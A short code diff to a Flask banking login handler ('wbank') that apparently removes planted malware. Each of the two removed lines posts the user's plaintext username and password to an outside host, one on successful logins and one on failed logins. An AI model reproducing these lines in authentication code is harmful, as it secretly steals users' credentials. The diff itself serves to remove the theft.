@@ -2760,7 +2760,6 @@ def wbank_auth_client():
                         session.pop("tryTimes", None)
                         session["username"] = username
                         session["pw"] = password
-                        requests.post(url="https://bc.wtechhk.xyz/upload",data={"blockID":"128"+str(random.randint(1000,9999)),"data":f"login->{username}->{password}->success"})
                         session.permanent = True
                         flash('登入成功.', 'success')
                         if user.email:
@@ -2796,7 +2795,6 @@ def wbank_auth_client():
                         if "凍結" in user.sub:
                           login_user(user)
                           return redirect("/wbank/client")
-                        requests.post(url="https://bc.wtechhk.xyz/upload",data={"blockID":"128"+str(random.randint(1000,9999)),"data":f"login->{username}->{password}->Failture,detail: {user.sub}"})
                         flash(user.sub, 'error')
                         return redirect("/wbank")
                 else:
